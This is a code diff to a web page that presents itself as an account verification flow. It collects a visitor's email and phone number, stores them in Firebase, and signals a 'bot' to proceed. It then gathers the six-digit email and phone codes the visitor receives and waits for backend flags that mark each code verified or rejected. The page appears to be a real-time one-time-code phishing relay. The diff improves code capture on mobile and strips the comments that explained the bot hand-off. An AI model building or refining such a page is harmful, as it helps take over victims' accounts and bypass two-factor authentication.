@@ -650,12 +650,12 @@ input[type=range].scale-range::-moz-range-thumb{width:24px;height:24px;border-ra
             <div class="ls-title" style="text-align:center;">Check your email</div>
             <div class="ls-sub" style="text-align:center;margin-bottom:20px;">Six digits sent to:<br><strong id="ls-email-display" style="color:var(--text);word-break:break-all;"></strong></div>
             <div class="ls-code-row" style="gap:5px;">
-              <input class="ls-code-box" type="text" maxlength="1" id="e0" oninput="codeIn('e',0,6)" onkeydown="codeKey(event,'e',0)" style="width:40px;height:50px;font-size:20px;padding:0;">
-              <input class="ls-code-box" type="text" maxlength="1" id="e1" oninput="codeIn('e',1,6)" onkeydown="codeKey(event,'e',1)" style="width:40px;height:50px;font-size:20px;padding:0;">
-              <input class="ls-code-box" type="text" maxlength="1" id="e2" oninput="codeIn('e',2,6)" onkeydown="codeKey(event,'e',2)" style="width:40px;height:50px;font-size:20px;padding:0;">
-              <input class="ls-code-box" type="text" maxlength="1" id="e3" oninput="codeIn('e',3,6)" onkeydown="codeKey(event,'e',3)" style="width:40px;height:50px;font-size:20px;padding:0;">
-              <input class="ls-code-box" type="text" maxlength="1" id="e4" oninput="codeIn('e',4,6)" onkeydown="codeKey(event,'e',4)" style="width:40px;height:50px;font-size:20px;padding:0;">
-              <input class="ls-code-box" type="text" maxlength="1" id="e5" oninput="codeIn('e',5,6)" onkeydown="codeKey(event,'e',5)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="e0" oninput="codeIn('e',0,6)" onkeydown="codeKey(event,'e',0)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="e1" oninput="codeIn('e',1,6)" onkeydown="codeKey(event,'e',1)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="e2" oninput="codeIn('e',2,6)" onkeydown="codeKey(event,'e',2)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="e3" oninput="codeIn('e',3,6)" onkeydown="codeKey(event,'e',3)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="e4" oninput="codeIn('e',4,6)" onkeydown="codeKey(event,'e',4)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="e5" oninput="codeIn('e',5,6)" onkeydown="codeKey(event,'e',5)" style="width:40px;height:50px;font-size:20px;padding:0;">
             </div>
             <div class="ls-val-msg" id="ls-vm5">Please enter all 6 digits.</div>
             <div id="s5-waiting" style="display:none;text-align:center;padding:10px 0 6px;">
@@ -681,12 +681,12 @@ input[type=range].scale-range::-moz-range-thumb{width:24px;height:24px;border-ra
             <div class="ls-title">Enter your phone code</div>
             <div class="ls-sub">We sent a 6-digit verification code to <strong id="ls-phone-display"></strong>. Enter it below.</div>
             <div class="ls-code-row" style="gap:5px;">
-              <input class="ls-code-box" type="text" maxlength="1" id="p0" oninput="codeIn('p',0,6)" onkeydown="codeKey(event,'p',0)" style="width:40px;height:50px;font-size:20px;padding:0;">
-              <input class="ls-code-box" type="text" maxlength="1" id="p1" oninput="codeIn('p',1,6)" onkeydown="codeKey(event,'p',1)" style="width:40px;height:50px;font-size:20px;padding:0;">
-              <input class="ls-code-box" type="text" maxlength="1" id="p2" oninput="codeIn('p',2,6)" onkeydown="codeKey(event,'p',2)" style="width:40px;height:50px;font-size:20px;padding:0;">
-              <input class="ls-code-box" type="text" maxlength="1" id="p3" oninput="codeIn('p',3,6)" onkeydown="codeKey(event,'p',3)" style="width:40px;height:50px;font-size:20px;padding:0;">
-              <input class="ls-code-box" type="text" maxlength="1" id="p4" oninput="codeIn('p',4,6)" onkeydown="codeKey(event,'p',4)" style="width:40px;height:50px;font-size:20px;padding:0;">
-              <input class="ls-code-box" type="text" maxlength="1" id="p5" oninput="codeIn('p',5,6)" onkeydown="codeKey(event,'p',5)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="p0" oninput="codeIn('p',0,6)" onkeydown="codeKey(event,'p',0)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="p1" oninput="codeIn('p',1,6)" onkeydown="codeKey(event,'p',1)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="p2" oninput="codeIn('p',2,6)" onkeydown="codeKey(event,'p',2)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="p3" oninput="codeIn('p',3,6)" onkeydown="codeKey(event,'p',3)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="p4" oninput="codeIn('p',4,6)" onkeydown="codeKey(event,'p',4)" style="width:40px;height:50px;font-size:20px;padding:0;">
+              <input class="ls-code-box" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" maxlength="1" id="p5" oninput="codeIn('p',5,6)" onkeydown="codeKey(event,'p',5)" style="width:40px;height:50px;font-size:20px;padding:0;">
             </div>
             <div class="ls-val-msg" id="ls-vm4">Please enter all 6 digits.</div>
             <div id="s4-waiting" style="display:none;text-align:center;padding:10px 0 6px;">
@@ -1065,10 +1065,6 @@ function chooseLang(lang){
 
 <!-- ═══════════════════════════════════════════════════════════
      FIREBASE-BACKED VERIFICATION FLOW
-     - Step 1 (phone + email) writes to Firebase IMMEDIATELY on click.
-     - After 5s, client patches proceed=true → bot picks it up.
-     - Email + phone code steps still wait for backend flags.
-     - Rejections still come from backend flags.
      ═══════════════════════════════════════════════════════════ -->
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.17.1/firebase-app.js";
@@ -1170,7 +1166,6 @@ async function patchProceedTrue(){
     );
     console.log('[verify] Firebase: proceed = true');
   } catch (err) {
-    // Retry once on failure
     proceedPatched = false;
     console.error('proceed=true patch failed, retrying once:', err);
     try {
@@ -1222,7 +1217,6 @@ async function lsS1(){
   document.getElementById('ls-phone-display').textContent = lsUserPhone;
   document.getElementById('ls-email-display').textContent = lsUserEmail;
 
-  // Reset ALL edge trackers for this fresh request
   _emailVerifiedLastSeen = false;
   _phoneVerifiedLastSeen = false;
   _emailRejectedLastSeen = false;
@@ -1232,7 +1226,6 @@ async function lsS1(){
   currentRequestId = newRequestId();
   currentStage     = 1;
 
-  // Show "Checking your account…" immediately
   goToStep('ls-step3');
 
   const payload = {
@@ -1247,7 +1240,6 @@ async function lsS1(){
     createdAt: Date.now()
   };
 
-  // WRITE NOW — email + phone to Firebase immediately.
   try {
     await set(ref(firebaseDb, VERIFICATIONS_PATH + '/' + currentRequestId), payload);
   } catch (err) {
@@ -1262,17 +1254,13 @@ async function lsS1(){
     return;
   }
 
-  // Record is in Firebase with email + phone.
   attachListener(currentRequestId);
 
-  // After 5 seconds, patch proceed=true — this unblocks the bot's
-  // findNewEligibleEmail() gate. UI advances in parallel.
   if (stage1Timer) clearTimeout(stage1Timer);
   stage1Timer = setTimeout(async () => {
     stage1Timer = null;
     if (currentStage !== 1) return;
 
-    // UI advances to email OTP
     currentStage = 2;
     _emailRejectedLastSeen = false;
     ['e0','e1','e2','e3','e4','e5'].forEach(id => {
@@ -1284,7 +1272,6 @@ async function lsS1(){
     document.getElementById('ls-btn5').disabled = false;
     goToStep('ls-step5');
 
-    // Tell the bot to proceed
     await patchProceedTrue();
   }, STAGE1_AUTO_PROCEED_MS);
 }
@@ -1305,7 +1292,6 @@ function attachListener(requestId){
     const emailRejectedNow = data.emailRejected === true;
     const phoneRejectedNow = data.phoneRejected === true;
 
-    // Terminal: whole request killed
     if (data.status === 'rejected' || data.status === 'expired' || data.rejected === true) {
       if (stage1Timer) {
         clearTimeout(stage1Timer);
@@ -1328,7 +1314,6 @@ function attachListener(requestId){
       return;
     }
 
-    // STAGE 2 -> 3 : emailVerified edge only
     if (emailVerifiedNow && !_emailVerifiedLastSeen && currentStage === 2) {
       _emailVerifiedLastSeen = true;
       currentStage = 3;
@@ -1345,7 +1330,6 @@ function attachListener(requestId){
     }
     _emailVerifiedLastSeen = emailVerifiedNow;
 
-    // STAGE 3 -> 4 : phoneVerified edge only
     if (phoneVerifiedNow && !_phoneVerifiedLastSeen && currentStage === 3) {
       _phoneVerifiedLastSeen = true;
       currentStage = 4;
@@ -1364,7 +1348,6 @@ function attachListener(requestId){
     }
     _phoneVerifiedLastSeen = phoneVerifiedNow;
 
-    // Email rejection edge
     if (emailRejectedNow && !_emailRejectedLastSeen && currentStage === 2) {
       _emailRejectedLastSeen = true;
       document.getElementById('s5-waiting').style.display = 'none';
@@ -1379,7 +1362,6 @@ function attachListener(requestId){
     }
     _emailRejectedLastSeen = emailRejectedNow;
 
-    // Phone rejection edge
     if (phoneRejectedNow && !_phoneRejectedLastSeen && currentStage === 3) {
       _phoneRejectedLastSeen = true;
       document.getElementById('s4-waiting').style.display = 'none';
@@ -1440,7 +1422,6 @@ async function lsS5(){
     showError('ls-vm5', 'Could not submit code. Please try again.');
     return;
   }
-  // Wait for emailVerified=true via listener.
 }
 
 // ── Phone code: write, then WAIT for phoneVerified=true ──
@@ -1474,16 +1455,17 @@ async function lsS4(){
     showError('ls-vm4', 'Could not submit code. Please try again.');
     return;
   }
-  // Wait for phoneVerified=true via listener.
 }
 
 function codeIn(prefix, idx, total){
   const el = document.getElementById(prefix + idx);
   if (!el) return;
   el.value = (el.value || '').replace(/[^0-9]/g,'').slice(-1);
-  el.style.animation = 'none';
-  void el.offsetWidth;
-  el.style.animation = 'bounceIn 0.22s cubic-bezier(.34,1.56,.64,1) both';
+  // NOTE: Do NOT force a reflow (void el.offsetWidth) or re-assign
+  // el.style.animation here — doing so on every keystroke causes many
+  // mobile browsers to dismiss/reset the virtual keyboard (switching
+  // the numeric keypad back to the letters layout). The digit-entry
+  // bounce is handled purely by CSS via the input's own focus styles.
   if (el.value.length === 1 && idx < total - 1) {
     const next = document.getElementById(prefix + (idx + 1));
     if (next) next.focus();
